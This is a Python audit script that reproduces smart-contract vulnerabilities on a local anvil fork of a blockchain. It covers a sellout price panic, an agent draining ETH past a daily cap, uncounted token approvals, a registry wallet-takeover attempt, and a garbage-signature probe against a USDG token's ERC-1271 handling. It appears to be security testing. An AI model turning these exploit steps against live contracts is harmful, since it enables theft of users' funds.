#!/usr/bin/env python3
"""Fork-attack phase for obol.sh on an anvil fork of Robinhood Chain (chain-id 4663).

Attacks attempted, in the order the spec lists them:
  A. Sellout index panic (F2)              - set sold=supply, read price()
  B. Agent ETH drain past maxPerDay (F1)   - armed agent, repeat execute(), read spentToday
  B2. Approve path uncounted (F1)          - repeat dollar approve, read spentToday
  C. Wallet takeover via registry (NSH-3)  - pre-create an unsold account, try to use it
  D. Gate negatives                        - before-open / wrong price / already sold
  E. USDG x402 ERC-1271 (open question #2) - does a garbage signature pass when the
                                             account has pre-approved the digest?
"""
import json, subprocess, sys, time

RPC = "http://127.0.0.1:8557"
SALE = "0xD22301bcA4eCfFb9F4B87792885D766595e7363c"
NFT  = "0x1BD783d8dcc50db3f610d1c46ec7e97d7f457402"
IMPL = "0xac855818bc77cd378d7ce24ab6151491e1623dc6"
REG  = "0x000000006551c19487814612e58FE06813775758"
USDG = "0x5fc5360d0400a0fd4f2af552add042d716f1d168"
ACCT0 = "0x0490414a5904c327868c4245e579d303647586ff"
HOLDER0 = "0xF3658ae51C0adBda5ABC93178E3fF6fb2D3735d9"
AGENT = "0x000000000000000000000000000000000000A9E7"
PAYEE = "0x000000000000000000000000000000000000BeEf"
SPENDER = "0x000000000000000000000000000000000000Cafe"
ZERO32 = "0x" + "00" * 32

def run(*args, check=False):
    args = [str(a) for a in args]
    p = subprocess.run(args, capture_output=True, text=True)
    out = (p.stdout or "").strip()
    err = (p.stderr or "").strip()
    if check and p.returncode != 0:
        raise RuntimeError(f"{' '.join(args)}\n{err}")
    return out if p.returncode == 0 else (err or out)

def cast(*args):
    return run("cast", *args, "--rpc-url", RPC)

def first(s):
    return s.split()[0] if s and s.split() else s

def num(x):
    """cast prints '10048 [1.004e4]' — take the literal value."""
    t = first(str(x))
    return int(t, 16) if t.startswith("0x") else int(t)

def bal(addr):
    """cast rpc returns JSON, so the hex comes back quoted."""
    raw = rpc("eth_getBalance", addr, "latest")
    if isinstance(raw, str) and raw.startswith('"'):
        raw = json.loads(raw)
    return int(raw.split()[0], 16)

def call(to, sig, *args):
    return cast("call", to, sig, *[str(a) for a in args])

def calldata(sig, *args):
    return run("cast", "calldata", sig, *[str(a) for a in args])

def send(to, sig, *args, frm=None):
    a = ["send", to, sig] + [str(x) for x in args]
    if frm: a += ["--from", frm, "--unlocked"]
    return cast(*a)

def rpc(method, *params):
    return cast("rpc", method, *[str(p) for p in params])

def ok(label, cond, detail=""):
    print(f"  [{'PASS' if cond else 'FAIL'}] {label} {detail}")
    return cond

print("=" * 78)
print("A. SELLOUT INDEX PANIC (F2)  — bandPrice is uint256[10]")
print("=" * 78)
sold_now = num(call(SALE, "sold()(uint256)"))
print(f"  fork sold = {sold_now}")
# slot 11 of DaemonSale = sold  (from storageLayout)
base = num(call(SALE, "supply()(uint256)"))
print(f"  supply    = {base}")
# price at 10047 -> last band, must work
rpc("anvil_setStorageAt", SALE, "0x" + format(11, "064x"), "0x" + format(base - 1, "064x"))
p_last = call(SALE, "price()(uint256)")
b9 = num(call(SALE, "bandPrice(uint256)(uint256)", 9))
print(f"  sold={base-1}: currentBand={call(SALE,'currentBand()(uint256)')} price={p_last}")
ok("last saleable band prices correctly", num(p_last) == b9, f"({num(p_last)/1e18} ETH)")
# price at 10048 == supply -> index 10
rpc("anvil_setStorageAt", SALE, "0x" + format(11, "064x"), "0x" + format(base, "064x"))
out = call(SALE, "price()(uint256)")
band_now = call(SALE, "currentBand()(uint256)")
print(f"  sold={base}: currentBand={band_now}")
print(f"  price() -> {out[:180]}")
ok("currentBand() returns BANDS (out of range)", str(band_now) == "10")
ok("price() PANICS at sellout (F2 reproduced)", "panic" in out.lower() or "0x32" in out.lower() or "revert" in out.lower())
rpc("anvil_setStorageAt", SALE, "0x" + format(11, "064x"), "0x" + format(sold_now, "064x"))
print(f"  (sold restored to {sold_now})")

print()
print("=" * 78)
print("B. AGENT ETH DRAIN PAST THE DAILY CAP (F1)")
print("=" * 78)
# fund the daemon wallet with ETH, arm it as the holder would
rpc("anvil_setBalance", ACCT0, hex(10**18))
rpc("anvil_setBalance", HOLDER0, hex(10**18))
rpc("anvil_setBalance", AGENT, hex(10**18))   # the agent key needs gas; the drain comes from the ACCOUNT
MAX_PER_CALL = 1_000_000      # 1 USDG (6dp)
MAX_PER_DAY  = 1_000_000      # 1 USDG per day  -> the ceiling the holder believes in
MAX_ETH_CALL = 5_000_000_000_000_000   # 0.005 ETH per call
print(f"  holder arms agent: maxPerCall=1 USDG, maxPerDay=1 USDG, maxEthPerCall=0.005 ETH")
out = send(ACCT0, "constitute(address,uint128,uint128,uint128,address[],address[])",
           AGENT, MAX_PER_CALL, MAX_PER_DAY, MAX_ETH_CALL, f"[{USDG},{SPENDER},{PAYEE}]", f"[{PAYEE}]", frm=HOLDER0)
ok("constitute() accepted from the holder", "status" in out or "transactionHash" in out, out.splitlines()[0][:60] if out else "")

before_eth = bal(ACCT0)
print(f"  wallet ETH before: {before_eth/1e18:.6f}")
target_eth_before = bal(PAYEE)
sent = 0
for i in range(5):
    o = send(ACCT0, "execute(address,uint256,bytes,uint8)", PAYEE, MAX_ETH_CALL, "0x", 0, frm=AGENT)
    if "status" in o and "1" in o.split("status")[1][:6]:
        sent += MAX_ETH_CALL
    else:
        print(f"    call {i+1} failed: {o[:150]}")
after_eth = bal(ACCT0)
target_eth_after = bal(PAYEE)
spent_today = num(call(ACCT0, "spentToday()(uint256)"))
print(f"  wallet ETH after : {after_eth/1e18:.6f}   (delta {-(after_eth-before_eth)/1e18:.6f} ETH)")
print(f"  payee  ETH       : {target_eth_after/1e18:.6f}")
print(f"  spentToday()     : {spent_today}   <-- should have counted the ETH outflow")
ok("ETH actually left the wallet in 5 agent calls", after_eth < before_eth, f"{-((after_eth-before_eth)/1e18):.6f} ETH out")
ok("daily counter blind to ETH (spentToday stays 0)", spent_today == 0, f"spentToday={spent_today}")
print(f"  RESULT: {-(after_eth-before_eth)/1e18:.6f} ETH moved vs a '1 USDG/day' ceiling -> daily cap bypassed")

print()
print("=" * 78)
print("B2. APPROVE PATH IS NEVER COUNTED EITHER")
print("=" * 78)
before_ap = num(call(ACCT0, "spentToday()(uint256)"))
cd = calldata("approve(address,uint256)", SPENDER, MAX_PER_CALL)
for i in range(3):
    send(ACCT0, "execute(address,uint256,bytes,uint8)", USDG, 0, cd, 0, frm=AGENT)
spent_apr = num(call(ACCT0, "spentToday()(uint256)"))
print(f"  after 3 dollar approvals of 1 USDG: spentToday={spent_apr} (was {before_ap})")
ok("approve() does not touch spentToday", spent_apr == 0)

print()
print("=" * 78)
print("C. WALLET TAKEOVER VIA THE PERMISSIONLESS REGISTRY (NSH-3)")
print("=" * 78)
UNSOLD = 5000
ATT = "0x00000000000000000000000000000000000dEaD1"
rpc("anvil_setBalance", ATT, hex(10**18))
w = call(SALE, "walletOf(uint256)(address)", UNSOLD)
print(f"  unsold #{UNSOLD} wallet (computed) = {w}")
out = send(REG, "createAccount(address,bytes32,uint256,address,uint256)(address)",
           IMPL, ZERO32, 4663, NFT, UNSOLD, frm=ATT)
print(f"  attacker createAccount -> {'ok' if 'status' in out else out[:90]}")
code = cast("code", w)
owner_after = call(w, "owner()(address)")
nft_owner = call(NFT, "ownerOf(uint256)(address)", UNSOLD)
print(f"  account code len   = {(len(code)-2)//2} bytes")
print(f"  account.owner()    = {owner_after}")
print(f"  nft.ownerOf(#5000) = {nft_owner}")
ok("pre-created account is still owned by the SALE, not the attacker",
   owner_after.lower() == nft_owner.lower() and "d22301" in owner_after.lower())
out = send(w, "execute(address,uint256,bytes,uint8)", ATT, 0, "0x", 0, frm=ATT)
ok("attacker cannot execute from that account", "status" not in out and "revert" in out.lower(), out[:110])

print()
print("=" * 78)
print("D. GATE NEGATIVES")
print("=" * 78)
free = call(NFT, "ownerOf(uint256)(address)", 9000)
print(f"  ownerOf(9000) = {free}")
o = send(SALE, "buy(uint256)", 9000, frm=HOLDER0)   # no value -> WrongPrice
ok("buy() with wrong value reverts", "revert" in o.lower() or "WrongPrice" in o, o[:90])
o = send(SALE, "buy(uint256)", 0, frm=HOLDER0)      # already sold -> NotForSale
ok("buy() of an already-sold daemon reverts", "revert" in o.lower() or "NotForSale" in o, o[:90])
ts = int(json.loads(cast("block", "latest", "--json"))["timestamp"], 0)
rpc("anvil_setTime", ts - 86400)
o = send(SALE, "buy(uint256)", 9000, "--value", "10000000000000000", frm=HOLDER0)
ok("buy() before opensAt reverts", "revert" in o.lower() or "NotOpen" in o, o[:90])
rpc("anvil_setTime", ts)

print()
print("=" * 78)
print("E. UX402 — DOES USDG CONSULT ERC-1271?  (open question #2)")
print("=" * 78)
nonce = "0x" + format(int(time.time()), "064x")
send(ACCT0, "constitute(address,uint128,uint128,uint128,address[],address[])",
     AGENT, 10**12, 10**12, 10**18, f"[{USDG},{SPENDER},{PAYEE}]", f"[{PAYEE}]", frm=HOLDER0)
out = send(ACCT0, "approvePayment(address,uint256,uint256,uint256,bytes32)",
           PAYEE, 1000000, 0, ts + 86400, nonce, frm=AGENT)
print(f"  approvePayment -> {out.splitlines()[0][:80] if out else out}")
digest = call(ACCT0, "paymentDigest(address,uint256,uint256,uint256,bytes32)(bytes32)",
              PAYEE, 1000000, 0, ts + 86400, nonce)
print(f"  account.paymentDigest = {digest}")
approved = call(ACCT0, "approvedDigest(bytes32)(bool)", digest)
ok("digest is marked approved", str(approved).lower().startswith("true"))
magic = call(ACCT0, "isValidSignature(bytes32,bytes)(bytes4)", digest, "0x" + "00" * 65)
print(f"  account.isValidSignature(digest, 65 zero bytes) = {magic}")
ok("account answers ERC-1271 for an approved digest", "1626ba7e" in magic.lower(), magic)
# the decisive probe: garbage signature; if USDG only ecrecovers it says invalid signature,
# if it consults ERC-1271 the account's approval carries it past signature checks.
o = call(USDG, "transferWithAuthorization(address,address,uint256,uint256,uint256,bytes32,uint8,bytes32,bytes32)",
         ACCT0, PAYEE, 1000000, 0, ts + 86400, nonce, 27, ZERO32, ZERO32)
print(f"  USDG.transferWithAuthorization(garbage sig) ->")
print(f"    {o[:220]}")
low = o.lower()
if "insufficient" in low or "balance" in low or "funds" in low:
    print("  VERDICT: USDG CONSULTED ERC-1271 (signature accepted, failed later on balance) -> x402 path is real")
elif "signature" in low or "invalid" in low:
    print("  VERDICT: USDG validates by ECDSA only -> the account's approved digests are unusable -> x402 is inert")
else:
    print("  VERDICT: inconclusive, read the revert above")

print()
print("=" * 78)
print("fork attack phase complete")
print("=" * 78)
